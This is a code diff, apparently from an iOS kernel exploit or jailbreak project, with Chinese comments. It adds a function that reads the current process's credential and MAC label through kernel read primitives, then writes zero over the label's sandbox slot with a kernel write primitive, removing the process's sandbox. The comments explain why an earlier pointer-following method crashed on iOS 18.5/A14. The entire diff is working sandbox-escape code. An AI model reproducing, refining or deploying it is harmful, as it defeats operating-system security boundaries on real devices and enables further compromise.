@@ -776,6 +776,44 @@ static int ds_patch_chain(uint64_t header, const char *rwClass)
     return patched;
 }
 
+/// 逃逸（无链路跟随版）—— 目前启用的方案。
+///
+/// 为什么不用 lara 那条 `label → sandbox → ext_set` 的链路：
+/// 它需要再解引用两个**未经验证**的地址（label+0x10 得到的 sandbox、sandbox+0x10 得到的 ext_set），
+/// 实测在 18.5/A14 上「点激活后 3~4 秒」就是崩在这两跳上（漏洞约 2~3 秒跑完，紧接着就是它）。
+///
+/// 换法：**不跟随任何指针**，直接把本进程 label 里的 sandbox 槽写成 NULL。
+/// 内核的沙盒钩子对「sandbox 为 NULL」的处理就是「不检查」（内核线程/无标签进程即此状态），
+/// 所以效果等于本进程没有沙盒。全程只有 1 次读 + 1 次写，且地址来自只读诊断轮验证过的算式
+/// （cred+0x78 → XPACI → zone 地址）。
+static int DSEscapeNullSandboxSlot(void)
+{
+    uint64_t cred = ds_discover_identities_v3();
+    if (!cred) return -2;
+
+    uint64_t rawLabel = ds_kread_safe(cred + DS_OFF_UCRED_CR_LABEL);
+    uint64_t label = ds_normalize_ptr(rawLabel);
+    if (!ds_is_kptr(label) || !ds_is_zone_ptr(label)) {
+        ds_log("[逃逸] cred=0x%llx，cred+0x%llx=0x%llx → 还原后 0x%llx 不是 zone 地址，停手",
+               (unsigned long long)cred, (unsigned long long)DS_OFF_UCRED_CR_LABEL,
+               (unsigned long long)rawLabel, (unsigned long long)label);
+        return -2;
+    }
+
+    uint64_t before = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
+    ds_log("[逃逸] cred=0x%llx label=0x%llx（原始存储值 0x%llx）sandbox 槽原值=0x%llx",
+           (unsigned long long)cred, (unsigned long long)label,
+           (unsigned long long)rawLabel, (unsigned long long)before);
+
+    // 0x20 字节读改写：只把 sandbox 这 8 字节清零，相邻字段原样保留
+    early_kwrite64(label + DS_OFF_LABEL_SANDBOX, 0);
+
+    uint64_t after = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
+    ds_log("[逃逸] 写入后 sandbox 槽=0x%llx（0 = 本进程已无沙盒）", (unsigned long long)after);
+
+    return (after == 0) ? 0 : -3;
+}
+
 static int DSEscapeSandboxInternal(void)
 {
     uint64_t ucred = ds_discover_identities_v3();
@@ -899,7 +937,7 @@ static int DSEscapeDiagnosticOnly(ds_escape_log_fn log)
 int DSEscapeSandbox(ds_escape_log_fn log)
 {
     gLog = log;
-    int result = DSEscapeSandboxInternal();
+    int result = DSEscapeNullSandboxSlot();
 
     // 失败时追加一份「cred 字段形态」的只读诊断，便于下一轮定位（不做任何跟随/写入）
     if (result != 0 && gUcred) {
